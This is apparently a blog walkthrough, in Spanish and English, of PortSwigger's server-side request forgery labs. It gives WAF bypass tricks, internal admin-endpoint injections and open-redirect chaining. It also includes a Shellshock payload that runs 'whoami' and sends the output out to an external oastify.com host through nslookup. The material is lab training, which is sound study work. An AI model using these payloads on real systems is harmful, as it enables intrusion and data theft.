---
layout: single
title: SSRF - PortSwigger
excerpt: "All Server-side request forgery labs of PortSwigger."
date: 2025-08-20
classes: wide
header:
  teaser: /img2/images/portswigger.png
  teaser_home_page: true
  icon: /img2/images/burp.jpg
categories:
  - portswigger
  - Web
tags:
  - Burpsuite
  - SSRF
---


## SSRF Tips

- WAF URL Bypass

```
http://127.1/
http://127.0.0.2/
http://127.14.3.2/
http://localhOst/
http://0x7f000001/    > HEXADECIMAL
http://2130706433/    > DECIMAL
```

- WAF DIRECTORY Bypass

```
adMin
%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
```

## SSRF básico contra servidor local || Basic SSRF against the local server

![](/img2/Pasted%20image%2020250816202751.png)

> Si hacemos una petición al localhost interno vemos que hay una ruta /admin.

![](/img2/Pasted%20image%2020250816202603.png)

> Dentro del directorio /admin tenemos la opción de borrar usuarios.

![](/img2/Pasted%20image%2020250816203351.png)

- Injection 

```
http://localhost/admin/delete?username=carlos
```

## SSRF básico contra sistema interno || Basic SSRF against another back-end system

![](/img2/Pasted%20image%2020250817121557.png)

![](/img2/Pasted%20image%2020250817121629.png)

![](/img2/Pasted%20image%2020250817121736.png)

> Con la funcionalidad de 'intruder' hacemos un escaneo de puertos internos. En el escaneo encontramos el puerto 67 abierto.

![](/img2/Pasted%20image%2020250817122304.png)

![](/img2/Pasted%20image%2020250817122356.png)

![](/img2/Pasted%20image%2020250817122453.png)

> Sobre la ip encontrada en el escaneo anterior, podemos hacer un fuzzing de directorios para encontrar rutas internas.

![](/img2/Pasted%20image%2020250817122535.png)

- Injection

```
http://192.168.0.67:8080/admin/delete?username=carlos
```

## SSRF básico contra sistema interno || Blind SSRF with out-of-band detection

![](/img2/Pasted%20image%2020250817123736.png)

> Al hacer varias peticiones en la web, vemos que se nos crea la cabecera 'Referer' la cual consiste en referenciar la url anterior, es decir la url desde donde haces la petición.

![](/img2/Pasted%20image%2020250817123821.png)

![](/img2/Pasted%20image%2020250817124017.png)

> Creamos nosotros una cabecera 'Referer' con nuestra propia url.

- Injection

```
https://6z6yin2a9d4a12xom2gj9456zx5otfh4.oastify.com
```

## SSRF con filtro basado en blacklist || SSRF with blacklist-based input filter

![](/img2/Pasted%20image%2020250818140811.png)

> Al intentar hacer una petición a un recurso interno, un WAF nos bloquea la petición.

![](/img2/Pasted%20image%2020250818140940.png)

![](/img2/Pasted%20image%2020250818141433.png)

![](/img2/Pasted%20image%2020250818141512.png)

> Tenemos varias formas de bypassear el WAF.

![](/img2/Pasted%20image%2020250818143129.png)

> Igual que antes vemos que hay un WAF que bloquea las peticiones que contengan el directorio admin.

![](/img2/Pasted%20image%2020250818143259.png)

![](/img2/Pasted%20image%2020250818143428.png)

> Para bypassear el WAF tenemos varias formas.

![](/img2/Pasted%20image%2020250818141956.png)

- Injection

```
http://localhoSt/adMin/delete?username=carlos
```

## Bypass SSRF con redirección abierta || SSRF with filter bypass via open redirection vulnerability

![](/img2/Pasted%20image%2020250818154610.png)

> El parámetro 'stockApi' nos redirige al directorio que indiquemos dentro de la web.

![](/img2/Pasted%20image%2020250818154821.png)

![](/img2/Pasted%20image%2020250818154907.png)

![](/img2/Pasted%20image%2020250818154955.png)

> En la función 'Next product' encontramos que el parámetro 'path' es vulnerable a Open Redirect.

![](/img2/Pasted%20image%2020250818155128.png)

> Para lograr el SSRF combinamos la redirección a un recurso interno con el parámetro 'stockApi' con el Open Redirect.

![](/img2/Pasted%20image%2020250818155421.png)

- Injection

```
/product/nextProduct?currentProductId=19%26path=http://192.168.0.12:8080/admin/delete?username=carlos
```

## SSRF ciego explotando Shellshock || Blind SSRF with Shellshock exploitation

![](/img2/Pasted%20image%2020250818163446.png)

![](/img2/Pasted%20image%2020250818163516.png)

> Detectamos que la cabecera 'Referer' es vulnerable a Blind SSRF.

![](/img2/Pasted%20image%2020250818163703.png)

![](/img2/Pasted%20image%2020250818163751.png)

> Detectamos que hay una vulnerabilidad Shellshock ejecutando el comando 'nslookup' en una ip interna por el puerto 8080.

![](/img2/Pasted%20image%2020250818163955.png)

![](/img2/Pasted%20image%2020250818164039.png)

> Para ver el output del comando 'whoami', podemos hacer uso de la función '$() como si fuera un subdominio de nuestro burp colaborator.

- Injection

```
() { :; }; /usr/bin/nslookup $(whoami).0hi18rwwqo678r7xf01w6ktam1ssgq4f.oastify.com
```

## SSRF con filtro basado en whitelist || SSRF with whitelist-based input filter

![](/img2/Pasted%20image%2020250818174226.png)

> Vemos que se está empleando un WAF, el cual solo permite peticiones al dominio 'stock.weliketoshop.net'.

![](/img2/Pasted%20image%2020250818174526.png)

> Tenemos la opción de autenticar un usuario en la url, podemos usar esta opción para aprovecharnos.

![](/img2/Pasted%20image%2020250818174654.png)

![](/img2/Pasted%20image%2020250818174747.png)

> Para que la web nos interprete la url 'localhost', podemos hacer uso del hash '#', el cual convertiría el dominio requerido por un directorio 'vacío' /#stock.weliketoshop.net. De esta forma respetamos la sintaxis de la autenticación permitida. Para que la web interprete el '/#' como parte de la misma url, tenemos que hacer un doble URL encode.

![](/img2/Pasted%20image%2020250818175048.png)

- Injection

```
http://localhost%25%32%66%25%32%33@stock.weliketoshop.net/admin/delete?username=carlos
```